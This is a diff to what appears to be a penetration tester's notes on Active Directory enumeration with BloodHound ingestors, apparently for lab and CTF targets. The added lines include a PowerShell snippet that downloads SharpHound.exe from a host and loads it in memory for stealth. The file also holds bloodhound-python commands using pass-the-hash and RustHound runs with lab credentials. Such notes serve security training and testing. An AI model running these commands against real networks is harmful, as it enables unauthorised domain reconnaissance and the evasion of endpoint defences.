@@ -40,11 +40,15 @@ SharpHound.exe --collectionmethods All
 download ***.zip
 ```
 
+```powershell
+# Execute BloodHound in memory for more stealth
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.100.223/SharpHound.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Sharphound.Program]::Main("--collectionmethods All --domain north.sevenkingdoms.local --searchforest true --outputdirectory c:\users\public\ --zipfilename bh_north_sevenkingdoms.zip".Split())
+```
 ### bloodhound.py
-https://github.com/fox-it/BloodHound.py
+https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce
 
-> From UNIX-like system, a non-official (but very effective nonetheless) Python version can be used.
-> 
 > BloodHound.py is a Python ingestor for BloodHound.
 > 
 > This ingestor is not as powerful as the C# one. It mostly misses GPO collection methods **but** a good news is that it can do pass-the-hash. It becomes really useful when compromising a domain account's NT hash.
@@ -56,4 +60,10 @@ bloodhound-python -u d.baker --hashes LM:NT -ns 10.129.234.143 -c all -d scepter
 bloodhound-python -u 'l.clark' -p '' -d 'infiltrator.htb' -gc 'dc01.infiltrator.htb' -ns 10.129.8.232 -c all --zip
 
 bloodhound.py --zip -c All -d $DOMAIN -u $USERNAME -p $PASSWORD -dc $DOMAIN_CONTROLLER
+```
+### Rusthound![[rusthound_logo_v3.png]]
+https://github.com/NH-RED-TEAM/RustHound
+
+```bash
+rusthound --domain north.sevenkingdoms.local -u "samwell.tarly" -p "Heartsbane"
 ```
